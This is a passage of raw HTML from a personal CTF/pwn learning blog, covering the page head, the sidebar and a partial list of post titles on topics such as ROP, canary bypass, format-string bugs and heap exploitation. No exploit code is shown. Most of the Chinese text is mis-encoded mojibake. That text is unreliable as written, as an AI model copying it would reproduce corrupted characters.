<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <title>å¤©é—®è®¡åˆ’week11-day2 | sixpar&#39;s blog</title>
  <meta name="keywords" content=" å¤©é—®è®¡åˆ’ ">
  <meta name="description" content="å¤©é—®è®¡åˆ’week11-day2 | sixpar&#39;s blog">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
<meta name="description" content="æ¬¢è¿æ‚¨çš„è®¿é—® æƒ³äº†è§£æˆ‘ï¼Ÿ æˆ‘åªæ˜¯æŸä¸çŸ¥åçš„pwnæ‰‹å™¢~">
<meta property="og:type" content="website">
<meta property="og:title" content="about">
<meta property="og:url" content="http://yoursite.com/about/index.html">
<meta property="og:site_name" content="sixpar&#39;s blog">
<meta property="og:description" content="æ¬¢è¿æ‚¨çš„è®¿é—® æƒ³äº†è§£æˆ‘ï¼Ÿ æˆ‘åªæ˜¯æŸä¸çŸ¥åçš„pwnæ‰‹å™¢~">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2020-07-02T13:45:54.000Z">
<meta property="article:modified_time" content="2020-07-04T03:37:23.628Z">
<meta property="article:author" content="sixpar">
<meta name="twitter:card" content="summary">


<link rel="icon" href="/img/avatar.jpg">

<link href="/css/style.css?v=1.1.0" rel="stylesheet">

<link href="/css/hl_theme/sunburst.css?v=1.1.0" rel="stylesheet">

<link href="//cdn.jsdelivr.net/npm/animate.css@4.1.0/animate.min.css" rel="stylesheet">

<script src="//cdn.jsdelivr.net/npm/jquery@3.5.1/dist/jquery.min.js"></script>
<script src="/js/titleTip.js?v=1.1.0" ></script>

<script src="//cdn.jsdelivr.net/npm/highlightjs@9.16.2/highlight.pack.min.js"></script>
<script>
    hljs.initHighlightingOnLoad();
</script>

<script src="//cdn.jsdelivr.net/npm/nprogress@0.2.0/nprogress.min.js"></script>



<script src="//cdn.jsdelivr.net/npm/jquery.cookie@1.4.1/jquery.cookie.min.js" ></script>

<script src="/js/iconfont.js?v=1.1.0" ></script>

<meta name="generator" content="Hexo 4.2.1"></head>
<div style="display: none">
  <input class="theme_disqus_on" value="false">
  <input class="theme_preload_comment" value="">
  <input class="theme_blog_path" value="">
  <input id="theme_shortcut" value="true" />
</div>


<body>
<aside class="nav">
    <div class="nav-left">
        <a href="/" class="avatar_target">
    <img class="avatar" src="/img/avatar.jpg" />
</a>
<div class="author">
    <span>sixpar</span>
</div>

<div class="icon">
    
        
    
        
        <a title="github" href="https://github.com/ccjacoo" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-github"></use>
                </svg>
            
        </a>
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
    
        
        <a title="qq" href="http://wpa.qq.com/msgrd?v=3&uin=570791563&site=qq&menu=yes" target="_blank">
            
                <svg class="iconfont-svg" aria-hidden="true">
                    <use xlink:href="#icon-qq"></use>
                </svg>
            
        </a>
        
    
</div>




<ul>
    <li><div class="all active" data-rel="All">All<small>(60)</small></div></li>
    
        
            
            <li><div data-rel="PWNé¢˜">PWNé¢˜<small>(16)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="ç¬”è®°">ç¬”è®°<small>(7)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="ç³»åˆ—">ç³»åˆ—<small>(26)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="ç”Ÿæ´»">ç”Ÿæ´»<small>(6)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="å­¦ä¹ ">å­¦ä¹ <small>(3)</small></div>
                
            </li>
            
        
    
        
            
            <li><div data-rel="é€†å‘é¢˜">é€†å‘é¢˜<small>(1)</small></div>
                
            </li>
            
        
    
</ul>
<div class="left-bottom">
    <div class="menus">
    
    
    
    
    </div>
    <div><a class="about  hasFriend  site_url"  href="/about">About</a><a style="width: 50%"  class="friends">Friends</a></div>
</div>
<input type="hidden" id="yelog_site_posts_number" value="60">
<input type="hidden" id="yelog_site_word_count" value="124.8k">
<div style="display: none">
    <span id="busuanzi_value_site_uv"></span>
    <span id="busuanzi_value_site_pv"></span>
</div>

    </div>
    <div class="nav-right">
        <div class="friends-area">
    <div class="friends-title">
        Links
        <i class="iconfont icon-left"></i>
    </div>
    <div class="friends-content">
        <ul>
            
            <li><a target="_blank" href="http://47.107.81.38">sixparçš„å°ç«™</a></li>
            
            <li><a target="_blank" href="http://v3ged4g.top">V3D4å¸ˆå‚…</a></li>
            
        </ul>
    </div>
</div>
        <div class="title-list">
    <div class="right-top">
        <div id="default-panel">
            <i class="iconfont icon-search" data-title="æœç´¢ å¿«æ·é”® i"></i>
            <div class="right-title">All</div>
            <i class="iconfont icon-file-tree" data-title="åˆ‡æ¢åˆ°å¤§çº²è§†å›¾ å¿«æ·é”® w"></i>
        </div>
        <div id="search-panel">
            <i class="iconfont icon-left" data-title="è¿”å›"></i>
            <input id="local-search-input" />
            <label class="border-line" for="input"></label>
            <i class="iconfont icon-case-sensitive" data-title="å¤§å°å†™æ•æ„Ÿ"></i>
            <i class="iconfont icon-tag" data-title="æ ‡ç­¾"></i>
        </div>
        <div id="outline-panel" style="display: none">
            <div class="right-title">å¤§çº²</div>
            <i class="iconfont icon-list" data-title="åˆ‡æ¢åˆ°æ–‡ç« åˆ—è¡¨"></i>
        </div>
    </div>

    <div class="tags-list">
    <input id="tag-search" />
    <div class="tag-wrapper">
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>Bypass-Canary</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>canary</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ctfwiki</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>DynELF</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>fd</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>gdb</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>heap</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>IO_File</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>IOç¼“å†²åŒº</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>partial_write</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>pycåç¼–è¯‘</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>reverse</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>ROP</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>shellcode</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>tcache dup</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>UAF</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>webpwn</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>å…¥é—¨</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>å…³äºæˆ‘</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>å†…æ ¸</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>åŠ«æŒå‡½æ•°</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>åŸºç¡€</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>å¤©é—®è®¡åˆ’</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>å®éªŒ</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>å»¶è¿Ÿç»‘å®š</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>æ•°ç»„æº¢å‡º</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>æ—¥è®°</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>æ ¼å¼åŒ–å­—ä¸²</a>
            </li>
        
            <li class="article-tag-list-item">
                <i class="iconfont icon-tag"></i><a>æ±‡ç¼–</a>
            </li>
        
    </div>

</div>

    
    <nav id="title-list-nav">
        
        <a  class="All ç³»åˆ— "
           href="/2020/08/11/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week13-day2/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week13-day2">å¤©é—®è®¡åˆ’week13-day2</span>
            <span class="post-date" title="2020-08-11 11:26:47">2020/08/11</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/08/10/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week13-day1/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week13-day1">å¤©é—®è®¡åˆ’week13-day1</span>
            <span class="post-date" title="2020-08-10 14:59:22">2020/08/10</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/08/09/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week12-day7/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week12-day7">å¤©é—®è®¡åˆ’week12-day7</span>
            <span class="post-date" title="2020-08-09 08:24:52">2020/08/09</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/08/08/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week12-day6/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week12-day6">å¤©é—®è®¡åˆ’week12-day6</span>
            <span class="post-date" title="2020-08-08 12:48:26">2020/08/08</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/08/07/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week12-day5/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week12-day5">å¤©é—®è®¡åˆ’week12-day5</span>
            <span class="post-date" title="2020-08-07 10:33:36">2020/08/07</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/08/06/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week12-day4/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week12-day4">å¤©é—®è®¡åˆ’week12-day4</span>
            <span class="post-date" title="2020-08-06 14:53:46">2020/08/06</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/08/05/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week12-day3/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week12-day3">å¤©é—®è®¡åˆ’week12-day3</span>
            <span class="post-date" title="2020-08-05 09:17:38">2020/08/05</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/08/04/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week12-day2/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week12-day2">å¤©é—®è®¡åˆ’week12-day2</span>
            <span class="post-date" title="2020-08-04 12:52:06">2020/08/04</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/08/03/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week12-day1/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week12-day1">å¤©é—®è®¡åˆ’week12-day1</span>
            <span class="post-date" title="2020-08-03 17:02:08">2020/08/03</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/08/02/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week11-day7/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week11-day7">å¤©é—®è®¡åˆ’week11-day7</span>
            <span class="post-date" title="2020-08-02 09:20:37">2020/08/02</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/08/01/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week11-day6/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week11-day6">å¤©é—®è®¡åˆ’week11-day6</span>
            <span class="post-date" title="2020-08-01 07:55:09">2020/08/01</span>
        </a>
        
        <a  class="All ç”Ÿæ´» "
           href="/2020/08/01/2020-8-1%E5%B0%8F%E8%AE%B0/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="2020-8-1å°è®°">2020-8-1å°è®°</span>
            <span class="post-date" title="2020-08-01 07:54:34">2020/08/01</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/31/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week11-day5/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week11-day5">å¤©é—®è®¡åˆ’week11-day5</span>
            <span class="post-date" title="2020-07-31 08:41:21">2020/07/31</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/30/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week11-day4/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week11-day4">å¤©é—®è®¡åˆ’week11-day4</span>
            <span class="post-date" title="2020-07-30 10:48:58">2020/07/30</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/29/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week11-day3/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week11-day3">å¤©é—®è®¡åˆ’week11-day3</span>
            <span class="post-date" title="2020-07-29 09:07:17">2020/07/29</span>
        </a>
        
        <a  class="All ç”Ÿæ´» "
           href="/2020/07/28/2020-7-28%E5%B0%8F%E8%AE%B0/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="2020-7-28å°è®°">2020-7-28å°è®°</span>
            <span class="post-date" title="2020-07-28 22:17:33">2020/07/28</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/28/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week11-day2/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week11-day2">å¤©é—®è®¡åˆ’week11-day2</span>
            <span class="post-date" title="2020-07-28 09:40:53">2020/07/28</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/27/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week11-day1/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week11-day1">å¤©é—®è®¡åˆ’week11-day1</span>
            <span class="post-date" title="2020-07-27 23:00:48">2020/07/27</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/26/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week10-day7/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week10-day7">å¤©é—®è®¡åˆ’week10-day7</span>
            <span class="post-date" title="2020-07-26 10:39:28">2020/07/26</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/25/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week10-day6/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week10-day6">å¤©é—®è®¡åˆ’week10-day6</span>
            <span class="post-date" title="2020-07-25 10:41:06">2020/07/25</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/24/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week10-day5/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week10-day5">å¤©é—®è®¡åˆ’week10-day5</span>
            <span class="post-date" title="2020-07-24 22:20:40">2020/07/24</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/23/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week10-day4/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’weeek10-day4">å¤©é—®è®¡åˆ’weeek10-day4</span>
            <span class="post-date" title="2020-07-23 23:11:16">2020/07/23</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/22/%E5%A4%A9%E9%97%AE%E8%AE%A1%E5%88%92week10-day3/"
           data-tag="å¤©é—®è®¡åˆ’"
           data-author="" >
            <span class="post-title" title="å¤©é—®è®¡åˆ’week10-day3">å¤©é—®è®¡åˆ’week10-day3</span>
            <span class="post-date" title="2020-07-22 22:12:41">2020/07/22</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/19/0day%E5%AE%89%E5%85%A8%E5%AE%9E%E9%AA%8C-2-4%E4%BB%A3%E7%A0%81%E6%A4%8D%E5%85%A5/"
           data-tag="å®éªŒ"
           data-author="" >
            <span class="post-title" title="0dayå®‰å…¨å®éªŒ-2.4ä»£ç æ¤å…¥">0dayå®‰å…¨å®éªŒ-2.4ä»£ç æ¤å…¥</span>
            <span class="post-date" title="2020-07-19 20:27:06">2020/07/19</span>
        </a>
        
        <a  class="All ç”Ÿæ´» "
           href="/2020/07/19/%EF%BC%88%E8%BD%AC%EF%BC%89%E6%B5%85%E8%B0%88%E4%BA%8C%E8%BF%9B%E5%88%B6%E6%BC%8F%E6%B4%9E%E4%B8%8E%E7%97%85%E6%AF%92%E7%A0%94%E7%A9%B6/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="ï¼ˆè½¬ï¼‰æµ…è°ˆäºŒè¿›åˆ¶æ¼æ´ä¸ç—…æ¯’ç ”ç©¶">ï¼ˆè½¬ï¼‰æµ…è°ˆäºŒè¿›åˆ¶æ¼æ´ä¸ç—…æ¯’ç ”ç©¶</span>
            <span class="post-date" title="2020-07-19 15:08:34">2020/07/19</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/19/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E8%BF%9B%E9%98%B6%E9%A2%98-stack2/"
           data-tag="ROP,æ•°ç»„æº¢å‡º"
           data-author="" >
            <span class="post-title" title="æ”»é˜²ä¸–ç•Œpwnè¿›é˜¶é¢˜-stack2">æ”»é˜²ä¸–ç•Œpwnè¿›é˜¶é¢˜-stack2</span>
            <span class="post-date" title="2020-07-19 09:26:26">2020/07/19</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/18/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E8%BF%9B%E9%98%B6%E9%A2%98-babyfengshui/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="æ”»é˜²ä¸–ç•Œpwnè¿›é˜¶é¢˜-babyfengshui">æ”»é˜²ä¸–ç•Œpwnè¿›é˜¶é¢˜-babyfengshui</span>
            <span class="post-date" title="2020-07-18 14:37:24">2020/07/18</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/17/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E8%BF%9B%E9%98%B6pwn%E9%A2%98-easypwn/"
           data-tag="æ ¼å¼åŒ–å­—ä¸²,partial_write"
           data-author="" >
            <span class="post-title" title="æ”»é˜²ä¸–ç•Œè¿›é˜¶pwné¢˜-easypwn">æ”»é˜²ä¸–ç•Œè¿›é˜¶pwné¢˜-easypwn</span>
            <span class="post-date" title="2020-07-17 21:19:04">2020/07/17</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8Cpwn%E8%BF%9B%E9%98%B6-easyfmt/"
           data-tag="æ ¼å¼åŒ–å­—ä¸²"
           data-author="" >
            <span class="post-title" title="æ”»é˜²ä¸–ç•Œpwnè¿›é˜¶-easyfmt">æ”»é˜²ä¸–ç•Œpwnè¿›é˜¶-easyfmt</span>
            <span class="post-date" title="2020-07-16 22:24:45">2020/07/16</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/16/%E6%94%BB%E9%98%B2%E4%B8%96%E7%95%8C%E5%88%9D%E9%98%B6%E5%9B%9E%E9%A1%BE/"
           data-tag=""
           data-author="" >
            <span class="post-title" title="æ”»é˜²ä¸–ç•Œåˆé˜¶å›é¡¾">æ”»é˜²ä¸–ç•Œåˆé˜¶å›é¡¾</span>
            <span class="post-date" title="2020-07-16 16:24:59">2020/07/16</span>
        </a>
        
        <a  class="All ç”Ÿæ´» "
           href="/2020/07/15/2020%E5%B9%B47%E6%9C%8815%E6%97%A5%E5%B0%8F%E8%AE%B0/"
           data-tag="æ—¥è®°"
           data-author="" >
            <span class="post-title" title="2020å¹´7æœˆ15æ—¥å°è®°">2020å¹´7æœˆ15æ—¥å°è®°</span>
            <span class="post-date" title="2020-07-15 22:07:29">2020/07/15</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/13/DynELF-L-CTF-2016-pwn100/"
           data-tag="DynELF,ROP"
           data-author="" >
            <span class="post-title" title="DynELF--L-CTF-2016-pwn100">DynELF--L-CTF-2016-pwn100</span>
            <span class="post-date" title="2020-07-13 14:39:51">2020/07/13</span>
        </a>
        
        <a  class="All é€†å‘é¢˜ "
           href="/2020/07/12/%E5%AE%89%E6%81%92%E6%9C%88%E8%B5%9B2019-1-%E6%9D%A5%E7%8E%A9%E8%9B%87%E5%90%A7/"
           data-tag="reverse,pycåç¼–è¯‘"
           data-author="" >
            <span class="post-title" title="å®‰æ’æœˆèµ›2019.1-æ¥ç©è›‡å§">å®‰æ’æœˆèµ›2019.1-æ¥ç©è›‡å§</span>
            <span class="post-date" title="2020-07-12 23:12:05">2020/07/12</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/12/plaidctf-2013-ropasaurusrex-DynELF/"
           data-tag="DynELF,ROP"
           data-author="" >
            <span class="post-title" title="plaidctf-2013-ropasaurusrex(DynELF)">plaidctf-2013-ropasaurusrex(DynELF)</span>
            <span class="post-date" title="2020-07-12 22:13:50">2020/07/12</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/11/CISCN-2018-Quals-echo-back/"
           data-tag="æ ¼å¼åŒ–å­—ä¸²,IO_File"
           data-author="" >
            <span class="post-title" title="CISCN-2018-Quals  echo_back">CISCN-2018-Quals  echo_back</span>
            <span class="post-date" title="2020-07-11 23:22:35">2020/07/11</span>
        </a>
        
        <a  class="All ç¬”è®° "
           href="/2020/07/09/dl-runtime-resolve%E5%87%BD%E6%95%B0%E8%BF%87%E7%A8%8B/"
           data-tag="å»¶è¿Ÿç»‘å®š"
           data-author="" >
            <span class="post-title" title="_dl_runtime_resolveå‡½æ•°è¿‡ç¨‹">_dl_runtime_resolveå‡½æ•°è¿‡ç¨‹</span>
            <span class="post-date" title="2020-07-09 10:01:47">2020/07/09</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/09/pwnable-tw-start/"
           data-tag="æ±‡ç¼–,shellcode"
           data-author="" >
            <span class="post-title" title="pwnable.tw-start">pwnable.tw-start</span>
            <span class="post-date" title="2020-07-09 00:08:11">2020/07/09</span>
        </a>
        
        <a  class="All ç¬”è®° "
           href="/2020/07/08/%E6%95%99%E4%BD%A0%E5%A6%82%E4%BD%95%E7%BC%96%E8%AF%91%E5%86%85%E6%A0%B8/"
           data-tag="å†…æ ¸"
           data-author="" >
            <span class="post-title" title="æ•™ä½ å¦‚ä½•ç¼–è¯‘å†…æ ¸">æ•™ä½ å¦‚ä½•ç¼–è¯‘å†…æ ¸</span>
            <span class="post-date" title="2020-07-08 18:24:00">2020/07/08</span>
        </a>
        
        <a  class="All å­¦ä¹  "
           href="/2020/07/07/IO%E7%BC%93%E5%86%B2%E5%8C%BA/"
           data-tag="IOç¼“å†²åŒº"
           data-author="" >
            <span class="post-title" title="IOç¼“å†²åŒº">IOç¼“å†²åŒº</span>
            <span class="post-date" title="2020-07-07 15:06:28">2020/07/07</span>
        </a>
        
        <a  class="All å­¦ä¹  "
           href="/2020/07/07/file-descriptor%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6/"
           data-tag="fd"
           data-author="" >
            <span class="post-title" title="file_descriptoræ–‡ä»¶æè¿°ç¬¦">file_descriptoræ–‡ä»¶æè¿°ç¬¦</span>
            <span class="post-date" title="2020-07-07 13:29:46">2020/07/07</span>
        </a>
        
        <a  class="All ç”Ÿæ´» "
           href="/2020/07/06/%E4%B8%8B%E4%B8%80%E9%98%B6%E6%AE%B5%E8%A7%84%E5%88%92/"
           data-tag="å…³äºæˆ‘"
           data-author="" >
            <span class="post-title" title="ä¸‹ä¸€é˜¶æ®µè§„åˆ’">ä¸‹ä¸€é˜¶æ®µè§„åˆ’</span>
            <span class="post-date" title="2020-07-06 10:15:46">2020/07/06</span>
        </a>
        
        <a  class="All PWNé¢˜ "
           href="/2020/07/05/X-MAS-CTF-web%E5%92%8Cpwn%E7%BB%93%E5%90%88/"
           data-tag="webpwn"
           data-author="" >
            <span class="post-title" title="X-MAS-CTF-webå’Œpwnç»“åˆ">X-MAS-CTF-webå’Œpwnç»“åˆ</span>
            <span class="post-date" title="2020-07-05 23:11:34">2020/07/05</span>
        </a>
        
        <a  class="All å­¦ä¹  "
           href="/2020/07/05/%E4%BB%80%E4%B9%88%E6%98%AFweb-server/"
           data-tag="webpwn"
           data-author="" >
            <span class="post-title" title="ä»€ä¹ˆæ˜¯web_server">ä»€ä¹ˆæ˜¯web_server</span>
            <span class="post-date" title="2020-07-05 21:37:36">2020/07/05</span>
        </a>
        
        <a  class="All ç”Ÿæ´» "
           href="/2020/07/05/%E7%94%9F%E6%B4%BB%E5%8C%BA%E5%BC%80%E7%AF%87/"
           data-tag="å…³äºæˆ‘"
           data-author="" >
            <span class="post-title" title="ç”Ÿæ´»åŒºå¼€ç¯‡">ç”Ÿæ´»åŒºå¼€ç¯‡</span>
            <span class="post-date" title="2020-07-05 16:07:45">2020/07/05</span>
        </a>
        
        <a  class="All ç¬”è®° "
           href="/2020/07/05/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93/"
           data-tag="æ ¼å¼åŒ–å­—ä¸²"
           data-author="" >
            <span class="post-title" title="æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ€»ç»“">æ ¼å¼åŒ–å­—ç¬¦ä¸²æ¼æ´æ€»ç»“</span>
            <span class="post-date" title="2020-07-05 14:48:42">2020/07/05</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/05/Bypass-Canary%E7%B3%BB%E5%88%97-%E5%8A%AB%E6%8C%81stack-chk-fail%E5%87%BD%E6%95%B0/"
           data-tag="Bypass-Canary,æ ¼å¼åŒ–å­—ä¸²,åŠ«æŒå‡½æ•°"
           data-author="" >
            <span class="post-title" title="Bypass-Canaryç³»åˆ—-åŠ«æŒstack_chk_failå‡½æ•°">Bypass-Canaryç³»åˆ—-åŠ«æŒstack_chk_failå‡½æ•°</span>
            <span class="post-date" title="2020-07-05 10:00:41">2020/07/05</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/04/Bypass-Canary%E7%B3%BB%E5%88%97-one-by-one-%E7%88%86%E7%A0%B4/"
           data-tag="Bypass-Canary"
           data-author="" >
            <span class="post-title" title="Bypass-Canaryç³»åˆ—-one-by-one-çˆ†ç ´">Bypass-Canaryç³»åˆ—-one-by-one-çˆ†ç ´</span>
            <span class="post-date" title="2020-07-04 23:26:42">2020/07/04</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/04/Bypass-Canary%E7%B3%BB%E5%88%97-%E6%B3%84%E9%9C%B2Canary%E5%80%BC/"
           data-tag="Bypass-Canary,æ ¼å¼åŒ–å­—ä¸²"
           data-author="" >
            <span class="post-title" title="Bypass-Canaryç³»åˆ—-æ³„éœ²Canaryå€¼">Bypass-Canaryç³»åˆ—-æ³„éœ²Canaryå€¼</span>
            <span class="post-date" title="2020-07-04 18:32:52">2020/07/04</span>
        </a>
        
        <a  class="All ç³»åˆ— "
           href="/2020/07/04/Bypass-Canary%E7%B3%BB%E5%88%97-%E7%B3%BB%E5%88%97%E4%BB%8B%E7%BB%8D/"
           data-tag="Bypass-Canary"
           data-author="" >
            <span class="post-title" title="Bypass-Canaryç³»åˆ—-ç³»åˆ—ä»‹ç»">Bypass-Canaryç³»åˆ—-ç³»åˆ—ä»‹ç»</span>
            <span class="post-date" title="2020-07-04 16:41:05">2020/07/04</span>
        </a>
        
        <a  class="All ç¬”è®° "
